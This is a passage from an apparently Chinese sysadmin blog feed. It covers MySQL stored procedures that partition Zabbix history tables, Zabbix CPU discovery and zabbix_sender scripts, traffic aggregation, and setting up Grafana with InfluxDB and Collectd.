list of all the partitions that are older than the date</div><div class="line">         in DELETE_BELOW_PARTITION_DATE.  All partitions are prefixed with</div><div class="line">         a &quot;p&quot;, so use SUBSTRING TO get rid of that character.</div><div class="line">      */</div><div class="line">      DECLARE myCursor CURSOR FOR</div><div class="line">              SELECT partition_name</div><div class="line">              FROM information_schema.partitions</div><div class="line">              WHERE table_schema = SCHEMANAME AND table_name = TABLENAME AND CAST(SUBSTRING(partition_name FROM 2) AS UNSIGNED) &amp;lt; DELETE_BELOW_PARTITION_DATE;</div><div class="line">      DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;</div><div class="line"></div><div class="line">      /*</div><div class="line">         Create the basics for when we need to drop the partition.  Also, create</div><div class="line">         @drop_partitions to hold a comma-delimited list of all partitions that</div><div class="line">         should be deleted.</div><div class="line">      */</div><div class="line">      SET @alter_header = CONCAT(&quot;ALTER TABLE &quot;, SCHEMANAME, &quot;.&quot;, TABLENAME, &quot; DROP PARTITION &quot;);</div><div class="line">      SET @drop_partitions = &quot;&quot;;</div><div class="line"></div><div class="line">      /*</div><div class="line">         Start looping through all the partitions that are too old.</div><div class="line">      */</div><div class="line">      OPEN myCursor;</div><div class="line">      read_loop: LOOP</div><div class="line">              FETCH myCursor INTO drop_part_name;</div><div class="line">              IF done THEN</div><div class="line">                      LEAVE read_loop;</div><div class="line">              END IF;</div><div class="line">              SET @drop_partitions = IF(@drop_partitions = &quot;&quot;, drop_part_name, CONCAT(@drop_partitions, &quot;,&quot;, drop_part_name));</div><div class="line">      END LOOP;</div><div class="line">      IF @drop_partitions != &quot;&quot; THEN</div><div class="line">              /*</div><div class="line">                 1\. Build the SQL to drop all the necessary partitions.</div><div class="line">                 2\. Run the SQL to drop the partitions.</div><div class="line">                 3\. Print out the table partitions that were deleted.</div><div class="line">              */</div><div class="line">              SET @full_sql = CONCAT(@alter_header, @drop_partitions, &quot;;&quot;);</div><div class="line">              PREPARE STMT FROM @full_sql;</div><div class="line">              EXECUTE STMT;</div><div class="line">              DEALLOCATE PREPARE STMT;</div><div class="line"></div><div class="line">              SELECT CONCAT(SCHEMANAME, &quot;.&quot;, TABLENAME) AS `table`, @drop_partitions AS `partitions_deleted`;</div><div class="line">      ELSE</div><div class="line">              /*</div><div class="line">                 No partitions are being deleted, so print out &quot;N/A&quot; (Not applicable) to indicate</div><div class="line">                 that no changes were made.</div><div class="line">              */</div><div class="line">              SELECT CONCAT(SCHEMANAME, &quot;.&quot;, TABLENAME) AS `table`, &quot;N/A&quot; AS `partitions_deleted`;</div><div class="line">      END IF;</div><div class="line">END$$</div><div class="line">DELIMITER ;</div><div class="line">**************************************partition_verify**************************************</div><div class="line">DELIMITER $$</div><div class="line">CREATE PROCEDURE `partition_verify`(SCHEMANAME VARCHAR(64), TABLENAME VARCHAR(64), HOURLYINTERVAL INT(11))</div><div class="line">BEGIN</div><div class="line">      DECLARE PARTITION_NAME VARCHAR(16);</div><div class="line">      DECLARE RETROWS INT(11);</div><div class="line">      DECLARE FUTURE_TIMESTAMP TIMESTAMP;</div><div class="line"></div><div class="line">      /*</div><div class="line">       * Check if any partitions exist for the given SCHEMANAME.TABLENAME.</div><div class="line">       */</div><div class="line">      SELECT COUNT(1) INTO RETROWS</div><div class="line">      FROM information_schema.partitions</div><div class="line">      WHERE table_schema = SCHEMANAME AND table_name = TABLENAME AND partition_name IS NULL;</div><div class="line"></div><div class="line">      /*</div><div class="line">       * If partitions do not exist, go ahead and partition the table</div><div class="line">       */</div><div class="line">      IF RETROWS = 1 THEN</div><div class="line">              /*</div><div class="line">               * Take the current date at 00:00:00 and add HOURLYINTERVAL to it.  This is the timestamp below which we will store values.</div><div class="line">               * We begin partitioning based on the beginning of a day.  This is because we don&apos;t want to generate a random partition</div><div class="line">               * that won&apos;t necessarily fall in line with the desired partition naming (ie: if the hour interval is 24 hours, we could</div><div class="line">               * end up creating a partition now named &quot;p201403270600&quot; when all other partitions will be like &quot;p201403280000&quot;).</div><div class="line">               */</div><div class="line">              SET FUTURE_TIMESTAMP = TIMESTAMPADD(HOUR, HOURLYINTERVAL, CONCAT(CURDATE(), &quot; &quot;, &apos;00:00:00&apos;));</div><div class="line">              SET PARTITION_NAME = DATE_FORMAT(CURDATE(), &apos;p%Y%m%d%H00&apos;);</div><div class="line"></div><div class="line">              -- Create the partitioning query</div><div class="line">              SET @__PARTITION_SQL = CONCAT(&quot;ALTER TABLE &quot;, SCHEMANAME, &quot;.&quot;, TABLENAME, &quot; PARTITION BY RANGE(`clock`)&quot;);</div><div class="line">              SET @__PARTITION_SQL = CONCAT(@__PARTITION_SQL, &quot;(PARTITION &quot;, PARTITION_NAME, &quot; VALUES LESS THAN (&quot;, UNIX_TIMESTAMP(FUTURE_TIMESTAMP), &quot;));&quot;);</div><div class="line"></div><div class="line">              -- Run the partitioning query</div><div class="line">              PREPARE STMT FROM @__PARTITION_SQL;</div><div class="line">              EXECUTE STMT;</div><div class="line">              DEALLOCATE PREPARE STMT;</div><div class="line">      END IF;</div><div class="line">END$$</div><div class="line">DELIMITER ;</div><div class="line">**************************************partition_maintenance**************************************</div><div class="line">DELIMITER $$</div><div class="line">CREATE PROCEDURE `partition_maintenance`(SCHEMA_NAME VARCHAR(32), TABLE_NAME VARCHAR(32), KEEP_DATA_DAYS INT, HOURLY_INTERVAL INT, CREATE_NEXT_INTERVALS INT)</div><div class="line">BEGIN</div><div class="line">      DECLARE OLDER_THAN_PARTITION_DATE VARCHAR(16);</div><div class="line">      DECLARE PARTITION_NAME VARCHAR(16);</div><div class="line">      DECLARE OLD_PARTITION_NAME VARCHAR(16);</div><div class="line">      DECLARE LESS_THAN_TIMESTAMP INT;</div><div class="line">      DECLARE CUR_TIME INT;</div><div class="line"></div><div class="line">      CALL partition_verify(SCHEMA_NAME, TABLE_NAME, HOURLY_INTERVAL);</div><div class="line">      SET CUR_TIME = UNIX_TIMESTAMP(DATE_FORMAT(NOW(), &apos;%Y-%m-%d 00:00:00&apos;));</div><div class="line"></div><div class="line">      SET @__interval = 1;</div><div class="line">      create_loop: LOOP</div><div class="line">              IF @__interval &amp;gt; CREATE_NEXT_INTERVALS THEN</div><div class="line">                      LEAVE create_loop;</div><div class="line">              END IF;</div><div class="line"></div><div class="line">              SET LESS_THAN_TIMESTAMP = CUR_TIME + (HOURLY_INTERVAL * @__interval * 3600);</div><div class="line">              SET PARTITION_NAME = FROM_UNIXTIME(CUR_TIME + HOURLY_INTERVAL * (@__interval - 1) * 3600, &apos;p%Y%m%d%H00&apos;);</div><div class="line">              IF(PARTITION_NAME != OLD_PARTITION_NAME) THEN</div><div class="line">                      CALL partition_create(SCHEMA_NAME, TABLE_NAME, PARTITION_NAME, LESS_THAN_TIMESTAMP);</div><div class="line">              END IF;</div><div class="line">              SET @__interval=@__interval+1;</div><div class="line">              SET OLD_PARTITION_NAME = PARTITION_NAME;</div><div class="line">      END LOOP;</div><div class="line"></div><div class="line">      SET OLDER_THAN_PARTITION_DATE=DATE_FORMAT(DATE_SUB(NOW(), INTERVAL KEEP_DATA_DAYS DAY), &apos;%Y%m%d0000&apos;);</div><div class="line">      CALL partition_drop(SCHEMA_NAME, TABLE_NAME, OLDER_THAN_PARTITION_DATE);</div><div class="line"></div><div class="line">END$$</div><div class="line">DELIMITER ;</div><div class="line">**************************************partition_maintenance_all**************************************</div><div class="line">DELIMITER $$</div><div class="line">CREATE PROCEDURE `partition_maintenance_all`(SCHEMA_NAME VARCHAR(32))</div><div class="line">BEGIN</div><div class="line">    CALL partition_maintenance(SCHEMA_NAME, &apos;history&apos;, 90, 24, 30);</div><div class="line">    #针对zabbix数据库（调用时传入zabbix数据库的库名）的history表创建分区，数据保留90天，分区时间间隔为24小时，每次创建30个分区</div><div class="line">    CALL partition_maintenance(SCHEMA_NAME, &apos;history_log&apos;, 90, 24, 30);</div><div class="line">    CALL partition_maintenance(SCHEMA_NAME, &apos;history_str&apos;, 90, 24, 30);</div><div class="line">    CALL partition_maintenance(SCHEMA_NAME, &apos;history_text&apos;, 90, 24, 30);</div><div class="line">    CALL partition_maintenance(SCHEMA_NAME, &apos;history_uint&apos;, 90, 24, 30);</div><div class="line">    CALL partition_maintenance(SCHEMA_NAME, &apos;trends&apos;, 730, 24, 15);</div><div class="line">    CALL partition_maintenance(SCHEMA_NAME, &apos;trends_uint&apos;, 730, 24, 30);</div><div class="line">END$$</div><div class="line">DELIMITER ;</div></pre></td></tr></table></figure>
<h5 id="设置分区表维护Event-Scheduler"><a href="#设置分区表维护Event-Scheduler" class="headerlink" title="设置分区表维护Event Scheduler"></a>设置分区表维护Event Scheduler</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">开启数据库Event Scheduler功能</div><div class="line">set GLOBAL event_scheduler=ON;</div><div class="line">创建事件zbx_partition_maintenance 每月1号1点执行partition_maintenance_all:</div><div class="line">DELIMITER $$</div><div class="line">CREATE EVENT `zbx_partition_maintenance`</div><div class="line">ON SCHEDULE every 1 month starts date_add(date_add(date_sub(curdate(),interval day(curdate())-1 day),interval 1 month),interval 1 HOUR)</div><div class="line">ON COMPLETION PRESERVE DO</div><div class="line">BEGIN</div><div class="line">    CALL partition_maintenance_all(&apos;zabbix&apos;) ; </div><div class="line">END$$</div><div class="line">DELIMITER ;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[zabbix LLD之多核CPU监控(备忘)]]></title>
      <url>/2016/12/10/zabbix-cpucores-lld.html</url>
      <content type="html"><![CDATA[<blockquote>
<ul>
<li>使用Zabbix自带的system.cpu.discovery实现CPU多核监控</li>
<li>Zabbix Agent 2.4+以上版本才开始支持</li>
</ul>
</blockquote>
<h4 id="创建发现规则"><a href="#创建发现规则" class="headerlink" title="创建发现规则"></a>创建发现规则</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2016/12/cpu_multi.jpg" alt=""></p>
<h4 id="创建监控项"><a href="#创建监控项" class="headerlink" title="创建监控项"></a>创建监控项</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2016/12/cpu_item.png" alt=""></p>
<h4 id="根据监控项创建图形"><a href="#根据监控项创建图形" class="headerlink" title="根据监控项创建图形"></a>根据监控项创建图形</h4><h4 id="创建触发器"><a href="#创建触发器" class="headerlink" title="创建触发器"></a>创建触发器</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2016/12/cpu_trigger.png" alt=""></p>
<h4 id="展示效果"><a href="#展示效果" class="headerlink" title="展示效果"></a>展示效果</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2016/12/cpu-core-pic.jpg" alt=""></p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[通过zabbix_sender实现批量传递key值(备忘)]]></title>
      <url>/2016/10/26/zabbix-trap-sender.html</url>
      <content type="html"><![CDATA[<blockquote>
<p>选择使用zabbix_sender的由来基于业务中需要从MySQL数据库中提取游戏在线人数(5个服务)，如果通过zabbix_get方式获取需要执行5次脚本获取，而通过zabbix_sender执行一次脚本可将5个服务的数据批量发送到zabbix trapper更为方便，减少了不必要的脚本执行</p>
</blockquote>
<p><strong>配置步骤如下:</strong></p>
<p><strong>1.配置zabbix_agentd.conf 自定义UserParameter</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UserParameter=send.online.count.data[*],/home/opt/scripts/online_count.sh $1</div><div class="line">/etc/init.d/zabbix_agent stop</div><div class="line">/etc/init.d/zabbix_agent start</div></pre></td></tr></table></figure></p>
<p>注释: 此步骤的目的是在zabbix server上创建key为send.online.count.data的item用于设置脚本的执行间隔，也可以在zabbix agent服务上设置crontab实现</p>
<p><strong>2.数据获取脚本</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">host_ip=$1</div><div class="line">zabbix_server_ip=&quot;10.1.1.1&quot;</div><div class="line">mysql  -C -N  -h localhost -u geekwolf -pgeekwolf &quot;--execute=select total,dota,war3vs,war3rpg,first_login from online_table;&quot;&gt;/tmp/.data</div><div class="line">Total=`cat /tmp/.data |awk &apos;&#123;print $1&#125;&apos;`</div><div class="line">Dota=`cat /tmp/.data |awk &apos;&#123;print $2&#125;&apos;`</div><div class="line">War3vs=`cat /tmp/.data |awk &apos;&#123;print $3&#125;&apos;`</div><div class="line">War3rpg=`cat /tmp/.data |awk &apos;&#123;print $4&#125;&apos;`</div><div class="line">First_Login=`cat /tmp/.data |awk &apos;&#123;print $5&#125;&apos;`</div><div class="line"></div><div class="line">echo &quot;$host_ip online_count[Total] $Total&quot; &gt;/tmp/count.log</div><div class="line">echo &quot;$host_ip online_count[Dota] $Dota&quot; &gt;&gt;/tmp/count.log</div><div class="line">echo &quot;$host_ip online_count[War3vs] $War3vs&quot; &gt;&gt;/tmp/count.log</div><div class="line">echo &quot;$host_ip online_count[War3rpg] $War3rpg&quot; &gt;&gt;/tmp/count.log</div><div class="line">echo &quot;$host_ip online_count[First_login] $First_Login&quot; &gt;&gt;/tmp/count.log</div><div class="line">zabbix_sender -z $zabbix_server_ip -i /tmp/count.log &gt;/dev/null</div></pre></td></tr></table></figure></p>
<p><strong>3.创建模板和项目</strong><br>A. 创建模板Online_Count_Template<br>B. 创建项目send.count.data<br><img src="http://ow1schdt5.bkt.clouddn.com/2016/10/t1.png" alt=""></p>
<p>C. 创建Total监控项,其他略<br><img src="http://ow1schdt5.bkt.clouddn.com/2016/10/t2.png" alt=""></p>
<p><strong>4. 创建图形</strong><br><img src="http://ow1schdt5.bkt.clouddn.com/2016/10/t3.png" alt=""></p>
<p><strong>5. 将模板关联到主机即可(可通过最新数据查看是否有数据上报 )</strong></p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[利用Zabbix做流量聚合汇总]]></title>
      <url>/2016/08/02/zabbix-traffic-sum.html</url>
      <content type="html"><![CDATA[<blockquote>
<ul>
<li>创建主机群组 : 数据大盘</li>
<li>创建主机 : Geekwolf</li>
<li>创建监控项：网卡流入流出，grpsum实现聚合</li>
<li>创建图形：关联监控项</li>
</ul>
</blockquote>
<h4 id="创建主机群组"><a href="#创建主机群组" class="headerlink" title="创建主机群组"></a>创建主机群组</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2016/08/dashboard.png" alt="此处输入图片的描述"></p>
<h4 id="创建主机Geekwolf"><a href="#创建主机Geekwolf" class="headerlink" title="创建主机Geekwolf"></a>创建主机Geekwolf</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2016/08/host1.png" alt="此处输入图片的描述"></p>
<h4 id="创建监控项：网卡流入流出，grpsum实现聚合"><a href="#创建监控项：网卡流入流出，grpsum实现聚合" class="headerlink" title="创建监控项：网卡流入流出，grpsum实现聚合"></a>创建监控项：网卡流入流出，grpsum实现聚合</h4><p>点击创建主机界面上方的项目</p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2016/08/host2.png" alt="此处输入图片的描述"><br> <img src="http://ow1schdt5.bkt.clouddn.com/2016/08/host3.png" alt="此处输入图片的描述"></p>
<h4 id="创建图形：关联监控项"><a href="#创建图形：关联监控项" class="headerlink" title="创建图形：关联监控项"></a>创建图形：关联监控项</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2016/08/host4.png" alt="此处输入图片的描述"></p>
<h4 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2016/08/traffic.png" alt="此处输入图片的描述"></p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Grafana+InfluxDB+Collectd构建监控系统]]></title>
      <url>/2016/04/28/grafana-influxdb-collectd.html</url>
      <content type="html"><![CDATA[<h4 id="架构原理"><a href="#架构原理" class="headerlink" title="架构原理"></a>架构原理</h4><blockquote>
<p>Collectd(数据采集,配置Server连接InfluxDB的25826端口) -&gt; InfluxDB(数据存储,启用collectd插件监听25826端口) —&gt; Grafana(数据展示)</p>
<ul>
<li>Collectd ： C 语言开发的一个守护(daemon)进程，周期性收集统计数据和存储，拥有丰富的插件包括监控Ceph,DRBD,OpenLDAP,ZK等，类似statD(graphite也可以用来采集数据，不过展示功能没有Grafana丰富)，数据可以存储在Kafka,InfluxDB，OpenTSDB等上*   InfluxDB:   GO开发的开源分布式时序数据库，适合存储指标，时间，分析等数据</li>
<li>Grafana： 是一个开源的，具有丰富指标仪表盘的数据展示和图表编辑工具，支持Graphite,Elasticsearch,OpenTSDB,Prometheus和influxDB,Zabbix等</li>
</ul>
</blockquote>
<h4 id="Collectd"><a href="#Collectd" class="headerlink" title="Collectd"></a>Collectd</h4><ol>
<li><p>安装collectd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">yum -y  install perl-ExtUtils-Embed perl-ExtUtils-MakeMaker  liboping* </div><div class="line">wget https://collectd.org/files/collectd-5.5.0.tar.gz</div><div class="line">tar xf collectd-5.5.0.tar.gz</div><div class="line">cd collectd-5.5.0</div><div class="line">./configure --enable-cpu  --enable-df --enable-disk --enable-interface --enable-load --enable-memory --enable-ping --enable-swap --enable-users --enable-uptime</div><div class="line">make &amp;amp;&amp;amp; make install</div><div class="line">cp contrib/redhat/init.d-collectd  /etc/rc.d/init.d/collectd</div><div class="line">chmod +x /etc/rc.d/init.d/collectd</div><div class="line">ln -s /opt/collectd/sbin/collectdmon  /usr/sbin/</div><div class="line">ln -s /opt/collectd/sbin/collectd  /usr/sbin/</div></pre></td></tr></table></figure>
</li>
<li><p>配置collectd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">vim /etc/collectd.conf</div><div class="line">BaseDir &quot;/opt/collectd&quot;</div><div class="line">PIDFile &quot;/run/collectd.pid&quot;</div><div class="line">Hostname &quot;host.example.com&quot;</div><div class="line">Interval 60</div><div class="line">&lt;loadplugin df&gt;</div><div class="line">Interval 120</div><div class="line">&lt;/loadplugin&gt;</div><div class="line">LoadPlugin disk</div><div class="line">LoadPlugin interface</div><div class="line">LoadPlugin load</div><div class="line">LoadPlugin memory</div><div class="line">LoadPlugin network</div><div class="line">LoadPlugin processes</div><div class="line">LoadPlugin users</div><div class="line">&lt;plugin interface&gt;</div><div class="line">Interface &quot;eth1&quot;</div><div class="line">IgnoreSelected false</div><div class="line">&lt;/plugin&gt;</div><div class="line">&lt;plugin network&gt;</div><div class="line">Server &quot;10.44.38.244&quot; &quot;25826&quot;</div><div class="line">&lt;/plugin&gt;</div></pre></td></tr></table></figure>
</li>
<li><p>说明<br>默认collectd进程会每10s中调用注册在配置文件中的插件，默认全局参数interval＝10s(10s上报一次数据到influxdb等)，针对不同的插件可以配置不同的搜集数据的时间间隔interval</p>
</li>
</ol>
<h4 id="InfluxDB"><a href="#InfluxDB" class="headerlink" title="InfluxDB"></a>InfluxDB</h4><ol>
<li><p>安装并启动服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">cat &lt; &lt;EOF | sudo tee /etc/yum.repos.d/influxdb.repo</div><div class="line">[influxdb]</div><div class="line">name = InfluxDB Repository - RHEL \$releasever</div><div class="line">baseurl = https://repos.influxdata.com/rhel/\$releasever/\$basearch/stable</div><div class="line">enabled = 1</div><div class="line">gpgcheck = 1</div><div class="line">gpgkey = https://repos.influxdata.com/influxdb.key</div><div class="line">EOF</div><div class="line">yum -y install influxdb</div><div class="line">service influxdb start</div><div class="line">启动后TCP端口:8083 为InfluxDB 管理控制台</div><div class="line">  TCP端口:8086 为客户端和InfluxDB通信时的HTTP API</div><div class="line">启动后InfluxDB用户认证默认是关闭的，先创建用户:geekwolf geekwolf</div><div class="line">命令行输入influx</div></pre></td></tr></table></figure>
</li>
<li><p>基本使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">[root@geekwolf ~]# influx</div><div class="line">Visit https://enterprise.influxdata.com to register for updates, InfluxDB server management, and monitoring.</div><div class="line">Connected to http://localhost:8086 version 0.12.2</div><div class="line">InfluxDB shell 0.12.2</div><div class="line">&gt; create database collectdb</div><div class="line">&gt; create database collectdb</div><div class="line">&gt; show databases</div><div class="line">name: databases</div><div class="line">\------</div><div class="line">name</div><div class="line">_internal</div><div class="line">collectdb</div><div class="line">&gt; create user geekwolf with password &apos;geekwolf&apos;</div><div class="line">&gt; show users</div><div class="line">user            admin</div><div class="line">geekwolf        false</div><div class="line">&gt; grant all on collectdb from to geekwolf</div><div class="line">&gt; help show</div><div class="line">Usage:</div><div class="line">    connect &lt;host:port&gt;   connects to another node specified by host:port</div><div class="line">    auth                  prompts for username and password</div><div class="line">    pretty                toggles pretty print for the json format</div><div class="line">    use &lt;db_name&gt;         sets current database</div><div class="line">    format &lt;format&gt;       specifies the format of the server responses: json, csv, or column</div><div class="line">    precision &lt;/format&gt;&lt;format&gt;    specifies the format of the timestamp: rfc3339, h, m, s, ms, u or ns</div><div class="line">    consistency &lt;level&gt;   sets write consistency level: any, one, quorum, or all</div><div class="line">    history               displays command history</div><div class="line">    settings              outputs the current settings for the shell</div><div class="line">    exit/quit/ctrl+d      quits the influx shell</div><div class="line">    show databases        show database names</div><div class="line">    show series           show series information</div><div class="line">    show measurements     show measurement information</div><div class="line">    show tag keys         show tag key information</div><div class="line">    show field keys       show field key information</div><div class="line">    A full list of influxql commands can be found at:</div><div class="line">    https://docs.influxdata.com/influxdb/v0.10/query_language/spec</div></pre></td></tr></table></figure>
</li>
<li><p>启用认证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">修改配置文件启用认证</div><div class="line">sed -i ’s#auth-enabled = false#auth-enabled = true#g’ /etc/influxdb/influxdb.conf</div><div class="line">service influxdb restart</div></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="配置InfluxDB支持Collectd"><a href="#配置InfluxDB支持Collectd" class="headerlink" title="配置InfluxDB支持Collectd"></a>配置InfluxDB支持Collectd</h4><ol>
<li><p>修改配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">vim /etc/influxdb/influxdb.conf</div><div class="line">[collectd]</div><div class="line">enabled = true</div><div class="line">bind-address = &quot;10.44.38.244:25826&quot;</div><div class="line">database = &quot;collectdb&quot;</div><div class="line">typesdb = &quot;/opt/collectd/share/collectd/types.db&quot;</div><div class="line">batch-size = 5000</div><div class="line">batch-pending = 10</div><div class="line">batch-timeout = &quot;10s&quot;</div><div class="line">read-buffer = 0</div><div class="line">service influxdb restart</div></pre></td></tr></table></figure>
</li>
<li><p>查看metrics信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">[root@geekwolf ~]# influx</div><div class="line">Visit https://enterprise.influxdata.com to register for updates, InfluxDB server management, and monitoring.</div><div class="line">Connected to http://localhost:8086 version 0.12.2</div><div class="line">InfluxDB shell 0.12.2</div><div class="line">&gt; use collectdb</div><div class="line">Using database collectdb</div><div class="line">&gt; show field keys</div><div class="line">name: cpu_value</div><div class="line">---------------</div><div class="line">fieldKey</div><div class="line">value</div><div class="line"></div><div class="line">name: df_free</div><div class="line">-------------</div><div class="line">fieldKey</div><div class="line">value</div><div class="line"></div><div class="line">name: df_used</div><div class="line">-------------</div><div class="line">fieldKey</div><div class="line">value</div><div class="line"></div><div class="line">name: disk_read</div><div class="line">---------------</div><div class="line">fieldKey</div><div class="line">value</div><div class="line">&gt; select * from cpu_value limit 15;</div><div class="line">name: cpu_value</div><div class="line">---------------</div><div class="line">time                    host                    instance        type    type_instance   value</div><div class="line">1461657293000000000     host.example.com        1               cpu     idle            1.59845e+06</div><div class="line">1461657293000000000     host.example.com        1               cpu     system          2316</div><div class="line">1461657293000000000     host.example.com        1               cpu     nice            508</div><div class="line">1461657293000000000     host.example.com        0               cpu     steal           0</div><div class="line">1461657293000000000     host.example.com        1               cpu     user            11619</div><div class="line">1461657293000000000     host.example.com        1               cpu     interrupt       0</div><div class="line">1461657293000000000     host.example.com        1               cpu     steal           0</div><div class="line">1461657293000000000     host.example.com        1               cpu     wait            172</div><div class="line">1461657293000000000     host.example.com        1               cpu     softirq         0</div><div class="line">1461657303000000000     host.example.com        1               cpu     wait            172</div><div class="line">1461657303000000000     host.example.com        1               cpu     softirq         0</div><div class="line">1461657303000000000     host.example.com        1               cpu     nice            508</div><div class="line">1461657303000000000     host.example.com        0               cpu     idle            1.587007e+06</div><div class="line">1461657303000000000     host.example.com        0               cpu     softirq         127</div><div class="line">1461657303000000000     host.example.com        0               cpu     interrupt       54</div></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="安装配置Grafana"><a href="#安装配置Grafana" class="headerlink" title="安装配置Grafana"></a>安装配置Grafana</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">yum install https://grafanarel.s3.amazonaws.com/builds/grafana-3.0.0-beta51460725904.x86_64.rpm</div><div class="line">目录结构</div><div class="line">/usr/sbin/grafana-server</div><div class="line">/etc/init.d/grafana-server          上述命令的拷贝，启动脚本</div><div class="line">/etc/sysconfig/grafana-server       环境变量</div><div class="line">/etc/grafana/grafana.ini            配置文件</div><div class="line">/var/log/grafana/grafana.log        日志文件</div><div class="line">/var/lib/grafana/grafana.db     sqlite3数据库</div><div class="line"></div><div class="line">启动服务: service grafana-server start</div><div class="line">         chkconfig grafana-server on</div></pre></td></tr></table></figure>
<blockquote>
<p>访问地址:<a href="http://10.44.38.244:3000" target="_blank" rel="external">http://10.44.38.244:3000</a> 默认账号为admin admin</p>
</blockquote>
<p>关闭Grafana注册功能:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sed -i ’s/#allow_sign_up = true/allow_sign_up = false/g’  /etc/grafana/grafana.ini,重启服务</div></pre></td></tr></table></figure></p>
<ul>
<li>添加InfluxDB数据源</li>
</ul>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2016/04/datasource.png" alt="此处输入图片的描述"></p>
<ul>
<li>添加ping图的例子</li>
</ul>
